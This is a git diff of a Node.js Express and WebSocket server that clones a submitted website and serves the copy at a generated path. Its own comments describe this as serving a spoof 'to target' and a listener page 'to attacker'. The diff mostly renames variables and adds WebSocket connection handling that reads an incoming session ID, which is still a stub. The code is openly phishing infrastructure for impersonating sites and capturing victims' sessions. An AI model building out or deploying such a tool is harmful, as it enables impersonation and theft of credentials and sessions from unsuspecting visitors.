@@ -9,7 +9,6 @@ const path = require('path')
 const Cache = require('./models/Cache')
 const Spoof = require('./models/Spoof')
 const WebSocket = require('ws')
-let spoofURL = "https://www.google.com"
 const log = console.log
 const PORT = 8888
 const app = exp()
@@ -29,10 +28,18 @@ server.listen(PORT, (err) => {
 })
 //* WEBSOCKET SERVER
 const wss = new WebSocket.Server({server})
-wss.on('connection', (ws)=>{
-    log('WSServer Listening')
+let clients = []
+wss.on('connection', (ws, request) => {
+    log('WSServer New Connection ' + request.socket.remoteAddress)
+    ws.send('WSServer Response', (err) => {
+        if(err) log(err)
+    })
     ws.on('message', (message) => {
-        log(message)
+        let sessionID = message
+
+    })
+    ws.on('close', (code) => {
+        log('Connection closed.')
     })
 })
 
@@ -47,35 +54,32 @@ app.use('/scripts', exp.static('scripts'))
 
 //* SERVE SPOOF TO TARGET
 app.get('/:spoof_id', (req, res)=>{
-    log("SPOOF VISIT: " + req.params.spoof_id)
-    // 404 on non existant spoof or invalid url
-    // if(!isURL(req.params.spoof_id)) return res.sendStatus(404)
+    // log("SPOOF VISIT: " + req.params.spoof_id)
     if(!page_cache.pages[req.params.spoof_id]) return res.redirect('/')
     res.send(page_cache.pages[req.params.spoof_id].rendered_page)
 })
 //* INITITATE SPOOF AND SERVE LISTENER PAGE TO ATTACKER
 app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
-    let url_2_spoof = decodeURI(req.body.url)
-    log(`Spoof request for __ ${url_2_spoof} __`)
-    let spoofPageObject = await create_spoof(url_2_spoof) // should return new path of spoofed page
+    let requestURL = decodeURI(req.body.url)
+    let spoofObject = await create_spoof(requestURL) // should return new path of spoofed page
     // TODO Replace redirect with ejs render function containing listener socket
-    if(!spoofPageObject) return res.redirect('/')
-    return res.render("spoofoutput.ejs", {page: spoofPageObject})
+    if(!spoofObject) return res.redirect('/')
+    return res.render("spoofoutput.ejs", {page: spoofObject})
 })
 
 
 //! Handle creation of new pages for caching
 async function create_spoof(url){ // creates spoof site and socket session, returns spoof Page object
     if(!isValid(url)) return null
-    let new_page = new Spoof(url)
-    let spoof_success = await new_page.downloadPage(url)
-    if(!spoof_success) return false
-    new_page.renderSpoof(url)
+    let newPage = new Spoof(url)
+    let spoofResponse = await newPage.downloadPage(url)
+    if(!spoofResponse) return false
+    newPage.renderSpoof(url)
     // set into global pages object
-    page_cache.addPage(new_page)
+    page_cache.addPage(newPage)
 
     //TODO Create new WS session
-    return new_page
+    return newPage
 }
 function isValid(url){
     if(isURL(url)) return true
